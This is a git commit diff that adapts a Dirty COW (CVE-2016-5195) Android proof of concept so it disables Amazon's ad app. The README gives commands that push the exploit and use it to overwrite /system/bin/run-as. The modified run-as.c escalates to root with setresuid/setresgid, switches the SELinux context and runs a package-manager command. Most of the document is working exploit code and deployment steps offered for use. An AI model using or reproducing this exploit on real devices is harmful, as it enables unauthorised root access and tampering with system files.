b67234a1715c4b1648327241ac89aa5fd9c3751c
Martin Mullins <martin.mullins942@gmail.com>
2016-11-21 18:06:30 -0800

    Modifications to run the package manager in the correct context/id to disable Amazon's ADs App.

--- README.md
+++ README.md
@@ -1,32 +1,12 @@
-# CVE-2016-5195
-CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android
-
+# Disable Amazon Ads (Using Exploit CVE-2016-5195)
 ```
-$ make root
-ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk
-make[1]: Entering directory `./CVE-2016-5195'
-[armeabi] Install        : dirtycow => libs/armeabi/dirtycow
-[armeabi] Install        : run-as => libs/armeabi/run-as
-make[1]: Leaving directory `./CVE-2016-5195'
-adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
-[100%] /data/local/tmp/dirtycow
-adb push libs/armeabi/run-as /data/local/tmp/run-as
-[100%] /data/local/tmp/run-as
-adb shell 'chmod 777 /data/local/tmp/run-as'
-adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
-warning: new file size (9464) and file old size (17944) differ
-
-size 17944
-
-
-[*] mmap 0xb51e5000
-[*] exploit (patch)
-[*] currently 0xb51e5000=464c457f
-[*] madvise = 0xb51e5000 17944
-[*] madvise = 0 1048576
-[*] /proc/self/mem 1635778560 1048576
-[*] exploited 0xb51e5000=464c457f
-adb shell /system/bin/run-as
-running as uid 2000
-uid 0
+# edit the Makefile to point to your NDK toolchain or use Android.mk
+$ make run-as
+$ make dirtycow
+$ adb push run-as /data/local/tmp
+$ adb push dirtycow /data/local/tmp
+$ adb shell /data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as
+$ adb shell /system/bin/run-as
+Package com.amazon.phoenix new state: disabled
+$
 ```
--- run-as.c
+++ run-as.c
@@ -1,13 +1,87 @@
 #include <unistd.h>
 #include <stdio.h>
+#include <dlfcn.h>
 #include <sys/capability.h>
+
+#ifdef DEBUG
+#include <android/log.h>
+#define LOG_TAG "removeads"
+#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__); printf(__VA_ARGS__); fflush(stdout);
+#else
+#define ALOG(...) ;
+#endif
+
+#define CONTEXT_SYS "u:r:shell:s0"
+
+int set_context_new(const char* cont) {
+    typedef int (*_setcon_ptr)(const char* context);
+    typedef int (*_getcon_ptr)(char** context);
+    ALOG("Read selinux.so");
+    void *handle = dlopen("libselinux.so",RTLD_LAZY);
+    ALOG("Done.");
+    if (handle)
+    {
+        _getcon_ptr _getcon = dlsym(handle, "getcon");
+        _setcon_ptr _setcon = dlsym(handle, "setcon");
+        char *conn = 0;
+        if (_getcon) {
+            int ret = _getcon(&conn);
+            if (ret) {
+                ALOG("Failed getting context: %d\n",ret);
+                return 2;
+            } else  {
+                ALOG("Current context: %s\n",conn);
+            }
+        }
+
+
+
+        if (_setcon)
+        {
+            int ret = _setcon(cont);
+            if (ret) {
+                ALOG("setcon error... %d\n", ret);
+                return 2;
+            } else {
+                ALOG("setcon success!\n");
+            }
+        }
+        else {
+            ALOG("setcon() not found\n");
+            return 2;
+        }
+        if (conn) {
+            ALOG("Old Context WAS: %s",conn);
+        }
+        char *connNew = 0;
+        if (_getcon) {
+            int ret = _getcon(&connNew);
+            if (ret) {
+                ALOG("Failed getting context: %d\n",ret);
+                return 2;
+            } else  {
+                ALOG("Current context: %s\n",connNew);
+            }
+        }
+        if (connNew) {
+            ALOG("New Context  IS: %s",connNew);
+        }
+
+    }
+    else {
+        ALOG("libselinux.so not found\n");
+        return 2;
+    }
+
+    return 0;
+}
 
 int main(int argc, char **argv)
 {
   struct __user_cap_header_struct capheader;
   struct __user_cap_data_struct capdata[2];
 
-  printf("running as uid %d\n", getuid());
+  ALOG("running as uid %d\n", getuid());
 
   memset(&capheader, 0, sizeof(capheader));
   memset(&capdata, 0, sizeof(capdata));
@@ -17,13 +91,23 @@ int main(int argc, char **argv)
   capdata[CAP_TO_INDEX(CAP_SETUID)].permitted |= CAP_TO_MASK(CAP_SETUID);
   capdata[CAP_TO_INDEX(CAP_SETGID)].permitted |= CAP_TO_MASK(CAP_SETGID);
   if (capset(&capheader, &capdata[0]) < 0) {
-    printf("Could not set capabilities: %s\n", strerror(errno));
+    ALOG("Could not set capabilities: %s\n", strerror(errno));
   }
 
   if(setresgid(0,0,0) || setresuid(0,0,0)) {
-    printf("setresgid/setresuid failed\n");
+    ALOG("setresgid/setresuid failed\n");
   }
+  ALOG("uid %d\n", getuid());
 
-  printf("uid %d\n", getuid());
+  if(set_context_new(CONTEXT_SYS)) {
+      ALOG("FAILURE\n");
+      return 2;
+  } 
+  ALOG("SUCCESS\n");
+
+#ifdef DEBUG
+  system("id");
+#endif
+  system("pm disable com.amazon.phoenix");
   return 0;
 }
